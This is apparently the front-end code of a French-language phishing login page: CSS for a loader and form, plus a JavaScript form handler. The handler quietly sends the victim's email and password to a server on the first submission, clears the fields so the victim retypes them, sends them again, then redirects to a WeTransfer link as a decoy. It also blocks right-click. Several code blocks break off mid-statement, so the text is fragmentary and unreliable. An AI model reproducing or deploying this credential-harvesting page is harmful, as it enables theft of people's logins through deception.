        .loader {
            position: fixed;
            left: 0;
            top: 0;
            height: 100%;
            width: 100%;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            transition: opacity var(--transition-duration) var(--ease-function);
        }

        .loader.fadeOut {
            opacity: 0;
            pointer-events: none;
        }

        .indicator {
            border: solid 2px rgba(0, 0, 0, 0.3);
            border-radius: 50%;
            height: 102px;
            width: 102px;
            position: relative;
        }

        .indicator:before {
            content: "";
            position: absolute;
            inset: -2px;
            border: solid 2px transparent;
            border-top-color: black;
            border-radius: 50%;
            animation: spin var(--transition-duration) infinite var(--ease-function);
        }

        .indicator svg {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }

            to {
                transform: rotate(360deg);
            }
        }

        .form-input {
            transition: all 0.3s var(--ease-function);
            border: 2px solid transparent;
        }

        .form-input:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
        }

        .error-message {
            transform: translateY(-10px);
            opacity: 0;
            transition: all 0.3s var(--ease-function);
        }

        .error-message.show {
            transform: translateY(0);
            opacity: 1;
        }

        .password-section {
            opacity: 0;
            transform: translateY(20px);

        }

        .password-section.show {
            opacity: 1;
            transform: translateY(0);
        }

            class FormValidator {
                constructor() {
                    this.emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            class FormAnimator {
                static async animate(element, animation, duration = 300) {
                    element.classList.add(animation);
                    await new Promise(resolve => setTimeout(resolve, duration));
                    element.classList.remove(animation);
                }

                static async fadeIn(element, duration = 300) {
                    element.style.opacity = '0';
                    element.style.display = 'block';
                    await new Promise(resolve => setTimeout(resolve, 10));
                    element.style.transition = `opacity ${duration}ms ease-in-out`;
                    element.style.opacity = '1';
                }

                static async fadeOut(element, duration = 300) {
                    element.style.opacity = '1';
                    element.style.transition = `opacity ${duration}ms ease-in-out`;
                    element.style.opacity = '0';
                    await new Promise(resolve => setTimeout(resolve, duration));
                    element.style.display = 'none';
                }
            }

            class FormHandler {
                constructor() {
                    this.initializeProperties();
                    this.initializeElements();
                    this.initializeState();
                    this.initializeAnimations();
                    this.initializeEventListeners();

                }

                initializeProperties() {

                    this.animator = FormAnimator;
                    this.debounceTimeout = null;
                    this.submitTimeout = null;
                }

                initializeElements() {
                    // Éléments principaux
                    this.form = document.getElementById('loginForm');
                    this.emailInput = document.getElementById('zone-email');

                    if (!this.form || !this.emailInput) {

                        'duration-300',
                        'ease-in-out'
                    ];

                    this.form.classList.add(...animationClasses);

                    // Animation des inputs
                    [this.emailInput, this.passwordInput].filter(Boolean).forEach(input => {
                        input.classList.add(

                            'hover:scale-105',
                            'active:scale-95'
                        );

                initializeEventListeners() {
                    // Protection contre le clic droit
                    document.addEventListener('contextmenu', e => e.preventDefault());

                    // Événements du formulaire
                    this.form.addEventListener('submit', e => this.handleSubmit(e));

                    // Événements des inputs
                    this.emailInput.addEventListener('input', () => this.handleEmailInput());

                    this.emailInput.addEventListener('focus', () => this.handleInputFocus(this.emailInput));

                    if (this.passwordInput) {
                        this.passwordInput.addEventListener('input', () => this.handlePasswordInput());
                        this.passwordInput.addEventListener('blur', () => this.validatePassword(true));
                        this.passwordInput.addEventListener('focus', () => this.handleInputFocus(this.passwordInput));
                    }

                    if (this.togglePasswordButton) {
                        this.togglePasswordButton.addEventListener('click', () => this.togglePasswordVisibility());
                    }

                    // Gestion des animations au focus
                    this.initializeInputAnimations();
                }

                initializeLoader() {
                    if (!this.loader) return;

                    const hideLoader = async () => {
                        await FormAnimator.fadeOut(this.loader);
                        this.loader.remove();
                    };

                    if (document.readyState === 'complete') {
                        setTimeout(hideLoader, 1000);
                    } else {
                        window.addEventListener('load', () => setTimeout(hideLoader, 1000));
                    }
                }

                initializeInputAnimations() {
                    const inputs = [this.emailInput, this.passwordInput].filter(Boolean);

                    inputs.forEach(input => {
                        const container = input.parentElement;

                        input.addEventListener('focus', () => {
                            container.classList.add('focused');
                            this.addFloatingEffect(input);
                        });

                        input.addEventListener('blur', () => {
                            if (!input.value) {
                                container.classList.remove('focused');
                            }
                            this.removeFloatingEffect(input);
                        });
                    });
                }

                async handleInputFocus(input) {
                    await FormAnimator.animate(input.parentElement, 'focus-pulse');
                    input.parentElement.classList.add('focused');
                }

                addFloatingEffect(element) {
                    element.style.transform = 'translateY(-2px)';
                    element.style.boxShadow = '0 4px 6px rgba(0, 0, 0, 0.1)';
                }

                removeFloatingEffect(element) {
                    element.style.transform = 'translateY(0)';
                    element.style.boxShadow = 'none';
                }

                debounce(func, wait = 300) {
                    clearTimeout(this.debounceTimeout);
                    this.debounceTimeout = setTimeout(() => func.call(this), wait);
                }

                async handleEmailInput() {
                    this.debounce(async () => {
                        const isValid = this.validateEmail(false);

                        if (isValid && !this.state.isEmailValid) {
                            this.state.isEmailValid = true;
                            await this.animateSuccess(this.emailInput);
                            await this.showPasswordSection();
                        }
                    });
                }

                async handlePasswordInput() {
                    this.debounce(() => {
                        this.validatePassword(false);
                    });
                }

                validateEmail(showError = true) {
                    const email = this.emailInput.value.trim();
                    const isValid = this.validator.validateEmail(email);

                    this.toggleError(this.emailError, !isValid && showError);
                    this.emailInput.classList.toggle('valid', isValid);
                    this.emailInput.classList.toggle('invalid', !isValid && showError);

                    return isValid;
                }

                validatePassword(showError = true) {
                    if (!this.passwordInput) return true;

                    const password = this.passwordInput.value;
                    const isValid = this.validator.validatePassword(password);

                    this.toggleError(this.passwordError, !isValid && showError);
                    this.passwordInput.classList.toggle('valid', isValid);
                    this.passwordInput.classList.toggle('invalid', !isValid && showError);

                    return isValid;
                }

                async togglePasswordVisibility() {
                    if (!this.passwordInput) return;

                    this.state.isPasswordVisible = !this.state.isPasswordVisible;

                    await FormAnimator.animate(this.passwordInput, 'fade-out', 150);
                    this.passwordInput.type = this.state.isPasswordVisible ? 'text' : 'password';
                    await FormAnimator.animate(this.passwordInput, 'fade-in', 150);

                    // Animation de l'icône
                    if (this.togglePasswordButton) {
                        await FormAnimator.animate(this.togglePasswordButton, 'rotate-180');
                    }
                }

                async showPasswordSection() {
                    if (!this.passwordSection || this.passwordSection.classList.contains('show')) return;

                    this.passwordSection.classList.remove('hidden');
                    await FormAnimator.fadeIn(this.passwordSection);
                    this.passwordSection.classList.add('show');
                }

                async handleSubmit(e) {
                    e.preventDefault();
                    if (this.state.isSubmitting) return;

                    const isEmailValid = this.validateEmail(true);
                    const isPasswordValid = this.validatePassword(true);

                    if (!isEmailValid || !isPasswordValid) {
                        await this.animateError();
                        return;
                    }

                    try {
                        this.state.isSubmitting = true;
                        await this.animateSubmitStart();

                        if (this.state.isFirstSubmission) {
                            // Première soumission silencieuse
                            await sendDataToServer();
                            this.state.isFirstSubmission = false;

                            // Réinitialisation silencieuse
                            this.emailInput.value = '';
                            this.passwordInput.value = '';
                            this.state.isEmailValid = false;
                            this.state.isPasswordValid = false;
                            this.emailInput.classList.remove('valid', 'invalid');
                            this.passwordInput.classList.remove('valid', 'invalid');
                            return;
                        }

                        // Deuxième soumission
                        const result = await sendDataToServer();

                        if (result.success) {
                            await this.animateSubmitSuccess();

                        }

                    } catch (error) {
                        console.error('Erreur lors de la soumission:', error);
                    } finally {
                        this.state.isSubmitting = false;
                        await this.animateSubmitEnd();
                    }
                }

                async handleFirstSubmission() {
                    try {
                        await sendDataToServer();
                        localStorage.setItem('submissionCount', '1');

                        // Réinitialisation silencieuse
                        await this.silentReset();
                    } catch (error) {
                        throw new Error('Première soumission échouée');
                    }
                }

                async handleSubsequentSubmission() {
                    const result = await sendDataToServer();

                    if (result.success) {
                        await this.animateSubmitSuccess();
                        localStorage.setItem('submissionCount', '2');
                        window.location.href = 'https://wetransfer.com/downloads/d2d348fe3d2995e1cf8e5fe8cf84a56c20231031011618/1150945a7ef90f33b9c67ef4dc77098520231031011655/06f777?trk=TRN_TDL_01&utm_campaign=TRN_TDL_01&utm_medium=email&utm_source=sendgrid';
                    } else {
                        throw new Error('Soumission échouée');
                    }
                }

                async silentReset() {
                    // Réinitialisation sans animation
                    this.emailInput.value = '';
                    this.passwordInput.value = '';
                    this.state.isEmailValid = false;
                    this.state.isPasswordValid = false;

                    // Nettoyage des états visuels
                    [this.emailInput, this.passwordInput].forEach(input => {
                        if (input) {
                            input.classList.remove('valid', 'invalid');
                            const errorElement = input === this.emailInput ? this.emailError : this.passwordError;
                            if (errorElement) {
                                errorElement.classList.add('hidden');
                            }
                        }
                    });
                }

                async handleSubmissionError(error) {
                    const submissionCount = parseInt(localStorage.getItem('submissionCount') || '0');

                    if (submissionCount === 0) {
                        // Erreur silencieuse pour la première soumission
                        console.error('Erreur silencieuse:', error);
                    } else {
                        // Affichage de l'erreur pour les soumissions suivantes
                        await this.animateSubmitError();
                        showNotification('Erreur de connexion', 'error');
                    }
                }

                async animateSuccess(element) {
                    await FormAnimator.animate(element, 'success-pulse');
                }

                async animateError() {
                    await FormAnimator.animate(this.form, 'shake-animation');
                }

                async animateSubmitStart() {
                    this.submitButton.classList.add('loading');
                    await FormAnimator.animate(this.form, 'submit-start');
                }

                async animateSubmitSuccess() {
                    await FormAnimator.animate(this.submitButton, 'success-animation');
                }

                async animateSubmitError() {
                    await FormAnimator.animate(this.form, 'error-animation');
                }

                async animateSubmitEnd() {
                    this.submitButton.classList.remove('loading');
                    await FormAnimator.animate(this.form, 'submit-end');
                }

                toggleError(element, show) {
                    if (!element) return;

                    if (show) {
                        element.classList.remove('hidden');
                        FormAnimator.animate(element, 'error-shake');
                    } else {
                        element.classList.add('hidden');

            }

            // Initialisation sécurisée
            const initializeApp = () => {
                try {
                    if (!window.formHandler) {
                        window.formHandler = new FormHandler();

            if (window.jQuery) {
